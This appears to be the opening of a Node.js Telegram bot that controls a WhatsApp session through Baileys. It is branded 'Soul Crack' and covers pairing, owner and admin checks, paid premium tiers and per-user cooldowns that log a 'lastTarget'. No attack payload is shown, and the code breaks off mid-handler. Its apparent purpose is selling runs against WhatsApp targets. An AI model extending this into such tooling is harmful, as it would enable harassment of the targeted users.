const {
  Telegraf,
  Markup
} = require("telegraf");
const fs = require('fs');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  jidEncode,
  encodeWAMessage,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const path = require("path");
const moment = require('moment-timezone');
//S

const {
  BOT_TOKEN,
  allowedDevelopers
} = require("./config");
const crypto = require('crypto');
const bot = new Telegraf(BOT_TOKEN, {
  handlerTimeout: 9_000_000
});
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

function getReplyMessageId(ctx) {
  if (ctx?.message?.message_id) return ctx.message.message_id;
  if (ctx?.update?.callback_query?.message?.message_id)
    return ctx.update.callback_query.message.message_id;

  return undefined;
}

async function denyNotAuthorized(ctx) {
  if (ctx?.update?.callback_query) {
    try {
      await ctx.answerCbQuery();
    } catch {}
  }
  return await ctx.reply("LU SIAPA BANGSAT?????", {
    reply_to_message_id: getReplyMessageId(ctx),
    reply_markup: {
      inline_keyboard: [
        [{
          text: "💬 t.me/zihardev",
          url: "https://t.me/zihardev"
        }]
      ]
    }
  });
}

async function guardOwnerOnly(ctx) {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    await denyNotAuthorized(ctx);
    return false;
  }
  return true;
}
async function guardOwnerOrAdmin(ctx) {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
    await denyNotAuthorized(ctx);
    return false;
  }
  return true;
}
const store = makeInMemoryStore({
  logger: pino({
    level: 'silent'
  })
});
const CD_FILE = path.resolve(process.cwd(), "cd.json");
const COOLDOWN_AFTER_DONE_MS = 3 * 60 * 1000;
const activeRunLocks = new Set();

function ensureCdFile() {
  if (!fs.existsSync(CD_FILE)) {
    fs.writeFileSync(CD_FILE, JSON.stringify({}, null, 2));
  }
}

function loadCdData() {
  ensureCdFile();
  try {
    const raw = fs.readFileSync(CD_FILE, "utf8");
    const data = raw ? JSON.parse(raw) : {};
    return data && typeof data === "object" ? data : {};
  } catch {
    fs.writeFileSync(CD_FILE, JSON.stringify({}, null, 2));
    return {};
  }
}

function saveCdData(data) {
  ensureCdFile();
  fs.writeFileSync(CD_FILE, JSON.stringify(data, null, 2));
}

function cleanupExpiredCd(data) {
  const now = Date.now();
  for (const [uid, info] of Object.entries(data)) {
    if (!info || typeof info !== "object") {
      delete data[uid];
      continue;
    }
    if (info.state === "cooldown" && info.until && now >= info.until) {
      delete data[uid];
      continue;
    }
    if (info.state === "running" && info.endAt && now >= info.endAt) {
      data[uid] = {
        state: "cooldown",
        until: now + COOLDOWN_AFTER_DONE_MS,
        lastTarget: info.lastTarget || null,
        lastDoneAt: now
      };
    }
  }
  return data;
}

function getUserState(userId) {
  const uid = String(userId);
  let data = loadCdData();
  data = cleanupExpiredCd(data);
  saveCdData(data);

  return data[uid] || null;
}

function setUserRunning(userId, payload) {
  const uid = String(userId);
  let data = loadCdData();
  data = cleanupExpiredCd(data);
  data[uid] = {
    state: "running",
    startedAt: payload.startedAt,
    endAt: payload.endAt,
    durationMs: payload.durationMs,
    lastTarget: payload.lastTarget || null
  };
  saveCdData(data);
}

function setUserCooldown(userId, payload) {
  const uid = String(userId);
  let data = loadCdData();
  data = cleanupExpiredCd(data);

  data[uid] = {
    state: "cooldown",
    until: payload.until,
    lastTarget: payload.lastTarget || null,
    lastDoneAt: payload.lastDoneAt || Date.now()
  };
  saveCdData(data);
}

function msToHuman(ms) {
  if (ms <= 0) return "0 detik";
  const s = Math.ceil(ms / 1000);
  const m = Math.floor(s / 60);
  const r = s % 60;
  if (m <= 0) return `${r} detik`;
  return `${m} menit ${r} detik`;
}
const PREM_FILE = path.resolve(process.cwd(), "premuserzbotZIHAR.json");

function ensurePremFile() {
  if (!fs.existsSync(PREM_FILE)) {
    fs.writeFileSync(PREM_FILE, JSON.stringify({}, null, 2));
  }
}

function loadPremData() {
  ensurePremFile();
  try {
    const raw = fs.readFileSync(PREM_FILE, "utf8");
    const data = raw ? JSON.parse(raw) : {};
    return data && typeof data === "object" ? data : {};
  } catch {
    fs.writeFileSync(PREM_FILE, JSON.stringify({}, null, 2));
    return {};
  }
}

function savePremData(data) {
  ensurePremFile();
  fs.writeFileSync(PREM_FILE, JSON.stringify(data, null, 2));
}

function cleanupExpiredPrem(data) {
  const now = Date.now();
  for (const [uid, info] of Object.entries(data)) {
    if (!info || typeof info !== "object") {
      delete data[uid];
      continue;
    }
    const exp = Number(info.expiresAt || 0);
    if (!exp || isNaN(exp) || now >= exp) {
      delete data[uid];
    }
  }
  return data;
}

function parseDays(input) {
  if (!input) return null;
  const s = String(input)
    .trim()
    .toLowerCase();
  const m = s.match(/^(\d{1,4})d$/); // contoh: 3d
  if (!m) return null;
  const days = parseInt(m[1], 10);
  if (isNaN(days)) return null;
  return days;
}

function formatWIB(tsMs) {
  return moment(tsMs)
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY HH:mm:ss") + " WIB";
}

function addOrExtendPremiumUser(userId, days, addedBy = null) {
  const uid = String(userId);
  const now = Date.now();
  let data = loadPremData();
  data = cleanupExpiredPrem(data);
  const existing = data[uid] || null;
  const baseTime =
    existing && existing.expiresAt && now < Number(existing.expiresAt) ?
    Number(existing.expiresAt) :
    now;
  const oldExpiresAt =
    existing && existing.expiresAt ? Number(existing.expiresAt) : null;
  const newExpiresAt = baseTime + days * 24 * 60 * 60 * 1000;
  data[uid] = {
    addedAt: existing?.addedAt || now,
    expiresAt: newExpiresAt,
    addedBy: addedBy ? String(addedBy) : (existing?.addedBy || null),
    lastExtendAt: now
  };
  savePremData(data);
  return {
    wasPremium: !!(existing && oldExpiresAt && now < oldExpiresAt),
    oldExpiresAt,
    newExpiresAt
  };
}

function getPremiumInfo(userId) {
  const uid = String(userId);
  let data = loadPremData();
  data = cleanupExpiredPrem(data);
  savePremData(data);
  return data[uid] || null;
}

function isPremiumUser(userId) {
  return !!getPremiumInfo(userId);
}
const checkPremium = async (ctx, next) => {
  if (isPremiumUser(ctx.from.id)) {
    return await next();
  } else {
    const premiumMessage = `
  𐊖𐊒𐌵𐎘
 ╔══════════════════
 ║ ❌ ACCESS DENIED!
 ║ 💎 Status: NON-PREMIUM
 ║ ⚠️ Need Premium Access
 ╚══════════════════`;

    return await ctx.reply(premiumMessage, {
      reply_markup: {
        inline_keyboard: [
          [{
            text: "💫 UPGRADE TO PREMIUM",
            url: "https://t.me/zihardev",
          }, ],
          [{
            text: "📖 PREMIUM FEATURES",
            callback_data: "premiuminfo",
          }, ],
        ],
      },
    });
  }
};
bot.action("premiuminfo", async (ctx) => {
  try {
    await ctx.answerCbQuery("📖 Premium info", {
      show_alert: false
    });
    const userId = ctx.from.id;
    const info = getPremiumInfo(userId);
    let statusText = "❌ NON-PREMIUM";
    let expText = "-";
    if (info) {
      statusText = "✅ PREMIUM ACTIVE";
      expText = formatWIB(info.expiresAt);
    }
    const text = `
╭═══════『 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐈𝐍𝐅𝐎 』═══════⊱
│
│ • Status: ${statusText}
│ • Expired: ${expText}
│
├─────『 𝐅𝐈𝐓𝐔𝐑 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 』
│ • Akses semua command premium
│ • Priority support
│ • Unlimited penggunaan
│ • Fitur eksklusif update
│
├─────『 𝐂𝐀𝐑𝐀 𝐔𝐏𝐆𝐑𝐀𝐃𝐄 』
│ • Klik tombol “UPGRADE”
│ • Chat admin untuk aktivasi
│
╰═════════════════════⊱
`.trim();

    await ctx.reply(text, {
      reply_to_message_id: ctx.update.callback_query.message.message_id,
      reply_markup: {
        inline_keyboard: [
          [{
            text: "💫 UPGRADE TO PREMIUM",
            url: "https://t.me/zihardev"
          }],
          [{
            text: "✅ CEK PREMIUM SAYA",
            callback_data: "cekprem_me"
          }]
        ]
      }
    });
  } catch (error) {
    console.error("Error premiuminfo:", error);
  }
});
bot.action("cekprem_me", async (ctx) => {
  try {
    await ctx.answerCbQuery("📊 Status premium kamu", {
      show_alert: false
    });
    const userId = ctx.from.id;
    const info = getPremiumInfo(userId);
    if (!info) {
      return await ctx.reply("❌ Kamu belum premium / sudah expired.", {
        reply_to_message_id: ctx.update.callback_query.message.message_id
      });
    }
    const sisaMs = info.expiresAt - Date.now();
    const sisaMenit = Math.ceil(sisaMs / 60000);
    await ctx.reply(
      `✅ Premium aktif!\n• Expired: ${formatWIB(info.expiresAt)}\n• Sisa: ~${sisaMenit} menit`, {
        reply_to_message_id: ctx.update.callback_query.message.message_id
      }
    );
  } catch (error) {
    console.error("Error cekprem_me:", error);
  }
});

function deletePremiumUser(userId) {
  const uid = String(userId);
  let data = loadPremData();
  data = cleanupExpiredPrem(data);
  const existed = !!data[uid];
  if (existed) {
    delete data[uid];
    savePremData(data);
  } else {
    savePremData(data);
  }

  return existed;
}
const ADMINS_FILE = path.resolve(process.cwd(), "admins.json");
let adminList = [];
function ensureAdminsFile() {
  if (!fs.existsSync(ADMINS_FILE)) {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify([], null, 2));
  }
}

function loadAdmins() {
  ensureAdminsFile();
  try {
    const raw = fs.readFileSync(ADMINS_FILE, "utf8");
    const data = raw ? JSON.parse(raw) : [];
    adminList = Array.isArray(data) ? data.map((x) => String(x)) : [];
  } catch (error) {
    console.error("Gagal memuat daftar admin:", error);
    adminList = [];
    fs.writeFileSync(ADMINS_FILE, JSON.stringify([], null, 2));
  }
  return adminList;
}

function saveAdmins() {
  ensureAdminsFile();
  fs.writeFileSync(ADMINS_FILE, JSON.stringify(adminList, null, 2));
}

function normalizeId(userId) {
  return String(userId)
    .trim();
}

function isAdmin(userId) {
  loadAdmins(); // selalu refresh dari file biar konsisten
  const uid = normalizeId(userId);
  return adminList.includes(uid);
}

function addAdmin(userId) {
  loadAdmins();
  const uid = normalizeId(userId);
  if (!adminList.includes(uid)) {
    adminList.push(uid);
    saveAdmins();
    return true;
  }
  return false;
}

function removeAdmin(userId) {
  loadAdmins();
  const uid = normalizeId(userId);
  const before = adminList.length;
  adminList = adminList.filter((id) => id !== uid);
  const changed = adminList.length !== before;
  if (changed) saveAdmins();
  else saveAdmins();

  return changed;
}

let sock = null;
let isWhatsAppConnected = false;
const usePairingCode = true;
let maintenanceConfig = {
  maintenance_mode: false,
  message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let ownerList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let whatsappUserInfo = null;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const isOwner = (userId) => {
  if (ownerList.includes(userId.toString())) {
    ownerataubukan = "✅";
    return true;
  } else {
    ownerataubukan = "❌";
    return false;
  }
};
const OWNER_ID = (userId) => {
  if (allowedDevelopers.includes(userId.toString())) {
    ysudh = "✅";
    return true;
  } else {
    gnymbung = "❌";
    return false;
  }
};
const startSesi = async () => {
  let retryCount = 0;
  const maxRetries = 3;
  const retryDelay = 5000;
  const attemptConnection = async () => {
    try {
      const {
        state,
        saveCreds
      } = await useMultiFileAuthState('./session');
      const {
        version
      } = await fetchLatestBaileysVersion();
      const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({
          level: "silent"
        }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
          conversation: 'P',
        }),
        connectTimeoutMs: 60000,
        qrTimeout: 30000,
      };
      sock = makeWASocket(connectionOptions);
      sock.ev.on('creds.update', saveCreds);
      store.bind(sock.ev);
      sock.ev.on('connection.update', async (update) => {
        const {
          connection,
          lastDisconnect
        } = update;
        if (connection === 'open') {
          isWhatsAppConnected = true;
          whatsappUserInfo = {
            name: sock?.user?.name,
            id: sock?.user?.id
          };
          retryCount = 0;
          const successMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
│ • Status: Connected ✅
│ • Name: ${sock?.user?.name || 'Unknown'}
│ • Number: ${sock?.user?.id?.split(':')[0] || 'Unknown'}
│
├─────『 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 』
│ • Mode: Active
│ • Version: 1
│ • Type: Multi-Device
│
╰═════════════════════⊱`;
          try {
            for (const ownerId of allowedDevelopers) {
              await bot.telegram.sendMessage(ownerId, successMessage);
            }
            for (const adminId of adminList) {
              if (!allowedDevelopers.includes(adminId)) {
                await bot.telegram.sendMessage(adminId, successMessage);
              }
            }
          } catch (error) {
            console.error('Error sending connect notification:', error);
          }
          console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────`));
        }
        if (connection === 'close') {
          isWhatsAppConnected = false;
          whatsappUserInfo = null;
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
          const isBanned = statusCode === 401 ||
            lastDisconnect?.error?.message?.includes('banned') ||
            lastDisconnect?.error?.message?.includes('Block');
          if (isBanned) {
            const bannedMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐚𝐧𝐧𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Status: Account Banned ⛔
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto deleting session
│ • Create new WhatsApp number
│
╰═════════════════════⊱`;
            try {
              for (const ownerId of allowedDevelopers) {
                await bot.telegram.sendMessage(ownerId, bannedMessage);
              }
              const sessionPath = './session';
              if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, {
                  recursive: true,
                  force: true
                });
                const deleteMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session cleared ✅
│ • Ready for new pairing
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing with new number
│
╰═════════════════════⊱`;
                for (const ownerId of allowedDevelopers) {
                  await bot.telegram.sendMessage(ownerId, deleteMessage);
                }
              }
              return;
            } catch (error) {
              console.error('Error handling ban:', error);
            }
          }
          if (retryCount < maxRetries && shouldReconnect) {
            retryCount++;
            const disconnectMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐋𝐨𝐬𝐭 』
│ • Status: Disconnected ❌
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Attempt: ${retryCount}/${maxRetries}
│ • Auto Reconnect: Yes
│
╰═════════════════════⊱`;
            try {
              for (const ownerId of allowedDevelopers) {
                await bot.telegram.sendMessage(ownerId, disconnectMessage);
              }
            } catch (error) {
              console.error('Error sending disconnect notification:', error);
            }
            console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));
            await new Promise(resolve => setTimeout(resolve, retryDelay));
            return attemptConnection();
          }
          if (retryCount >= maxRetries) {
            const maxRetriesMessage = `
╭═══════『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐅𝐚𝐢𝐥𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Max retries reached ❌
│ • Failed to connect ${maxRetries}x
│ • Possible account issue
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto clearing session...
│
╰═════════════════════⊱`;
            try {
              for (const ownerId of allowedDevelopers) {
                await bot.telegram.sendMessage(ownerId, maxRetriesMessage);
              }
              const sessionPath = './session';
              if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, {
                  recursive: true,
                  force: true
                });
                const clearMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session deleted ✅
│ • System ready for new setup
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing to connect new number
│
╰═════════════════════⊱`;
                for (const ownerId of allowedDevelopers) {
                  await bot.telegram.sendMessage(ownerId, clearMessage);
                }
              }
            } catch (error) {
              console.error('Error handling max retries:', error);
            }
          }
        }
      });
    } catch (error) {
      console.error('Connection error:', error);
      if (retryCount < maxRetries) {
        retryCount++;
        console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return attemptConnection();
      }
    }
  };
  return attemptConnection();
};
(async () => {
  console.log(chalk.whiteBright.bold(`
╭──────────────────────────────────────────────╮
│                                              │
│     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     │
│     ████████████████████████████████████     │    
│     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀     │
│                                              │
│        Welcome to Soul Crack         │
│     @zihardev    │
│                                              │
╰──────────────────────────────────────────────╯
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃        SUKSES MEMUAT DATABASE OWNER          ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
  loadAdmins();
  startSesi();
 // addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();

bot.command("removeallbot", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, 'choose_sticker');
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    await ctx.telegram.sendSticker(ctx.chat.id,
      'CAACAgUAAxkBAAEODo9n0ChtIFw4aeY8nOWm4BrF1fbthgAC7AYAAoNJ-VUl9_10WPFNjzYE', {
        reply_to_message_id: ctx.message.message_id
      });
  }
  try {
    const confirmationMessage = `
╭═══════『 ⚠️ 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐟𝐢??𝐦𝐚𝐭𝐢𝐨𝐧 』
│ • Action: Remove All Bot Sessions
│ • Impact: All WhatsApp connections will be lost
│ • Status: Awaiting Confirmation
│
├─────『 ??𝐨𝐭𝐞 』
│ • This action cannot be undone
│ • You'll need to pair again after this
│
╰═════════════════════⊱`;
    await ctx.reply(confirmationMessage, {
      reply_markup: {
        inline_keyboard: [
          [{
              text: "✅ Yes, Remove All",
              callback_data: "confirm_remove"
            },
            {
              text: "❌ Cancel",
              callback_data: "cancel_remove"
            }
          ]
        ]
      }
    });
  } catch (error) {
    console.error('Remove Bot Error:', error);
    await ctx.reply("❌ Terjadi kesalahan saat mencoba menghapus session.");
  }
});
bot.action('confirm_remove', async (ctx) => {
  try {
    await ctx.deleteMessage();
    if (sock && isWhatsAppConnected) {
      await sock.logout();
      isWhatsAppConnected = false;
      whatsappUserInfo = null;
    }
    const sessionPath = './session';
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, {
        recursive: true,
        force: true
      });
    }
    const successMessage = `
╭═══════『 ✅ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Action: Remove All Bot Sessions
│ • Status: Completed Successfully
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing to connect new bot
│
╰═════════════════════⊱`;
    await ctx.reply(successMessage);
  } catch (error) {
    console.error('Remove Session Error:', error);
    await ctx.reply("❌ Terjadi kesalahan saat menghapus session.");
  }
});
bot.action('cancel_remove', async (ctx) => {
  await ctx.deleteMessage();
  await ctx.reply("⚠️ Penghapusan session dibatalkan.");
});

bot.command("addpairing", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
  if (!(await guardOwnerOrAdmin(ctx))) return;
  
  function formatPhoneNumber(number) {
    let cleaned = number.replace(/[^0-9]/g, '');
    cleaned = cleaned.replace(/^\+/, '');
    if (cleaned.startsWith('0')) {
      return '62' + cleaned.slice(1);
    } else if (cleaned.startsWith('62')) {
      return cleaned;
    } else {
      return cleaned;
    }
  }
  const args = ctx.message.text.split(/\s+/);
  if (args.length < 2) {
    const helpMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
│
├─────『 𝐅𝐨??𝐦𝐚𝐭 』
│ • /addpairing 628xxxxxxxxxx
│ • /addpairing +1234567890    
│ • /addpairing 0812xxxxx
│
├─────『 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐝 』
│ • Indonesian numbers (62/0)
│ • International numbers
│ • With/without country code
│
╰═════════════════════⊱`;
    return await ctx.reply(helpMessage);
  }
  let phoneNumber = args.slice(1)
    .join('');
  phoneNumber = formatPhoneNumber(phoneNumber);
  try {
    if (!sock || !isWhatsAppConnected) {
      await ctx.reply("⏳ Menginisialisasi koneksi WhatsApp...");
      await startSesi();
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
    await ctx.reply("⏳ Memproses permintaan pairing...");
    let pairingCode;
    let retryCount = 0;
    const maxRetries = 3;
    while (retryCount < maxRetries && !pairingCode) {
      try {
        pairingCode = await sock.requestPairingCode(phoneNumber);
        if (!pairingCode || pairingCode.length < 4) {
          throw new Error('Invalid pairing code received');
        }
      } catch (error) {
        retryCount++;
        if (retryCount === maxRetries) throw error;
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
    const initialMsg = await ctx.reply(`
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: \`${pairingCode}\`
│ • Status: Generated ✅
│ • Expires in: 30 seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`);
    let timeLeft = 60;
    const countdownInterval = setInterval(async () => {
      timeLeft--;
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        try {
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            initialMsg.message_id,
            null,
            `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: EXPIRED ⌛
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Code has expired
│ • Please request new code
│
╰═════════════════════⊱`
          );
        } catch (error) {
          console.error("Error updating expired message:", error);
        }
        return;
      }
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          initialMsg.message_id,
          null,
          `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: Active ✅
│ • Expires in: ${timeLeft} seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`
        );
      } catch (error) {
        console.error("Error updating countdown:", error);
      }
    }, 1000);
  } catch (error) {
    console.error('Pairing Error:', error);
    const errorMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐄𝐫𝐫𝐨𝐫 』═══════⊱
│
├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ • Error: Failed to generate code
│ • Number: ${phoneNumber}
│
├─────『 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧𝐬 』
│ • Check if number is registered
│ • Check internet connection
│ • Try again later
│
╰═════════════════════⊱`;
    await ctx.reply(errorMessage);
    if (!isWhatsAppConnected) {
      startSesi();
    }
  }
});

bot.command("addprem", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
  if (!(await guardOwnerOrAdmin(ctx))) return;
  let userId, days;
  const args = ctx.message.text.trim()
    .split(/\s+/);
  if (ctx.message.reply_to_message) {
    userId = ctx.message.reply_to_message.from.id.toString();
    const dur = args[1];
    const parsedDays = parseDays(dur);
    if (parsedDays === null) {
      return await ctx.reply(
        "❌ Format durasi salah.\n\nGunakan:\n- Reply: /addprem 3d\n- Manual: /addprem <id_user> 3d\n\nCatatan: durasi wajib pakai 'd' (hari).", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    days = parsedDays;
  } else {
    if (args.length < 3) {
      return await ctx.reply(
        "❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem 3d\n- Manual: /addprem <id_user> 3d\n\nContoh: /addprem 123456789 7d", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }

    userId = String(args[1])
      .trim();
    const dur = args[2];
    const parsedDays = parseDays(dur);
    if (parsedDays === null) {
      return await ctx.reply(
        "❌ Format durasi salah! Wajib format 'Xd' (hari).\nContoh: 1d, 7d, 30d", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    days = parsedDays;
  }
  if (days < 1) {
    return await ctx.reply("❌ Minimal durasi adalah 1d (1 hari).", {
      reply_to_message_id: ctx.message.message_id
    });
  }
  if (days > 400) {
    return await ctx.reply("❌ Maksimal durasi adalah 400d (400 hari).", {
      reply_to_message_id: ctx.message.message_id
    });
  }
  try {
    const info = addOrExtendPremiumUser(userId, days, ctx.from.id);
    const expiresAt = info.expiresAt;
    const formattedExpiration = formatWIB(expiresAt);
    let userInfo = "";
    if (ctx.message.reply_to_message) {
      const u = ctx.message.reply_to_message.from;
      userInfo =
        `│ - *Username:* ${u.username ? "@" + u.username : "Tidak ada"}\n` +
        `│ - *Nama:* ${u.first_name || "Tidak diketahui"}\n`;
    }

    const successMessage = `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐔𝐬𝐞𝐫 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ - *ID User:* ${userId}
${userInfo}│ - *Status:* Premium Active ✅
│ - *Durasi:* ${days} hari
│ - *Expired:* ${formattedExpiration}
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Akses ke semua fitur premium
│ • Priority support
│ • Unlimited penggunaan
│
╰═════════════════════⊱`.trim();

    await ctx.replyWithMarkdown(successMessage, {
      reply_markup: {
        inline_keyboard: [
          [{
            text: "📊 Cek Status Premium",
            callback_data: `cekprem_${userId}`
          }],
          [{
            text: "📚 Panduan Premium",
            callback_data: "premium_guide"
          }]
        ]
